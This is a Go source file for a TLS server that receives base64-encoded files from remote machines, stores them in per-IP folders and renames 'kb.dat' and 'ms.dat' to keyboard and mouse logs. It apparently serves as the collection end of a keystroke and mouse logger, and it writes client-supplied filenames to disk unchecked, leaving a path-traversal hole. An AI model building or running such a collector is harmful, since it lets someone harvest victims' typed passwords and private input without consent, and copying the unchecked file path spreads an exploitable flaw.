//go:build server
// +build server

package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"strings"
	"time"
)

func main() {
	folder := "data"
	if _, err := os.Stat(folder); os.IsNotExist(err) {
		err := os.Mkdir(folder, 0755)
		if err != nil {
			fmt.Println("Error creating folder:", err)
			return
		}
		fmt.Println("Folder created:", folder)
	} else {
		fmt.Println("Folder already exists:", folder)
	}

	err := os.Chdir(folder)
	if err != nil {
		fmt.Println("Error changing directory:", err)
		return
	}

	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println("Error getting current directory:", err)
		return
	}
	fmt.Println("Current directory is now:", cwd)

	cert, err := generateCert()
	if err != nil {
		fmt.Println("Error generating certificate:", err)
		return
	}

	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
	}

	listener, err := tls.Listen("tcp", ":25557", config)
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	fmt.Println("listening on port 25557 with TLS...")
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue
		}
		go handleIncoming(conn)
	}
}

func handleIncoming(conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	senderIP, _, err := net.SplitHostPort(remoteAddr)
	if err != nil {
		fmt.Println("Error parsing remote address:", err)
		senderIP = remoteAddr
	}

	// Sanitize IP address for folder name (replace : with _)
	senderFolder := strings.ReplaceAll(senderIP, ":", "_")
	if _, err := os.Stat(senderFolder); os.IsNotExist(err) {
		err := os.Mkdir(senderFolder, 0755)
		if err != nil {
			fmt.Println("Error creating sender folder:", err)
			return
		}
		fmt.Println("Created folder for sender:", senderFolder)
	}

	reader := bufio.NewReader(conn)
	fileName, _ := reader.ReadString('\n')
	fileName = strings.TrimSpace(fileName)

	// Map incoming filenames to readable names
	var outputFileName string
	switch fileName {
	case "kb.dat":
		outputFileName = "keyboard.txt"
	case "ms.dat":
		outputFileName = "mouse.txt"
	default:
		outputFileName = fileName
	}

	// Read the entire Base64 encoded content
	var encodedData strings.Builder
	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		encodedData.WriteString(scanner.Text())
		encodedData.WriteString("\n")
	}

	// Decode Base64 content
	lines := strings.Split(encodedData.String(), "\n")
	filePath := senderFolder + string(os.PathSeparator) + outputFileName
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		decodedBytes, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			// If decoding fails, write as-is
			file.WriteString(line + "\n")
			continue
		}

		file.Write(decodedBytes)
	}

	fmt.Println("Received and decoded file from", senderIP+":", outputFileName)
}

func generateCert() (tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"FileTransfer"},
		},
		NotBefore:   time.Now(),
		NotAfter:    time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:    x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses: []net.IP{
			net.IPv4(127, 0, 0, 1),
			net.IPv4(0, 0, 0, 0),
		},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

	return tls.X509KeyPair(certPEM, keyPEM)
}
